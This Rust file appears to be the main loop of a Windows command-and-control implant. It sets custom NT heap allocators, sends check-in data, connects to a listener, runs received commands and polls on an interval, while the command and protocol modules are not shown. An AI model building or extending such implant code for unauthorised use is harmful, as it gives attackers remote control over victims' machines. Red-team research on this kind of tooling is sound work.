use libc_print::libc_println;

extern crate alloc;
use alloc::sync::Arc;

pub mod command;
pub mod common;
pub mod handler;
pub mod init;

use handler::command_handler;
use init::{init_checkin_data, init_protocol};
use mod_agentcore::instance;
use mod_win32::nt_time::delay;
use rs2_runtime::Runtime;

// Set a custom global allocator
#[cfg(feature = "nt-virtualalloc")]
use mod_nt_virtualalloc::NtVirtualAlloc;
#[cfg(feature = "nt-virtualalloc")]
#[global_allocator]
static GLOBAL: NtVirtualAlloc = NtVirtualAlloc;

#[cfg(feature = "nt-heapalloc")]
use mod_nt_heapalloc::NT_HEAPALLOCATOR;

// Set a custom runtime
#[cfg(feature = "std-runtime")]
use mod_std_runtime::StdRuntime;

#[cfg(feature = "nostd-nt-runtime")]
use mod_nostd_nt_runtime::NoStdNtRuntime;

/// Main routine that initializes the runtime and repeatedly checks the connection status.
pub fn routine() {
    #[cfg(feature = "std-runtime")]
    let rt = Arc::new(StdRuntime::new(4));

    #[cfg(feature = "nostd-nt-runtime")]
    let rt = Arc::new(NoStdNtRuntime::new(4));

    loop {
        unsafe {
            if !instance().session.connected {
                // If not connected, try to connect to the listener
                init_protocol(rt.clone());
            }

            if instance().session.connected {
                // If connected, handle incoming commands
                command_handler(rt.clone());
            }

            // Sleep for 15 seconds before checking again, ensuring all tasks are done.
            libc_println!("Sleep: {}", instance().config.polling_interval);
            rt.block_on(async {
                delay(instance().config.polling_interval);
            });
        }
    }
}

/// Main function that initializes the global instance, checkin data, and starts the routine.
fn main() {
    // Initialize global heap allocator
    #[cfg(feature = "nt-heapalloc")]
    NT_HEAPALLOCATOR.initialize();

    init_checkin_data(); // Initialize checkin data
    routine(); // Start the main routine
}
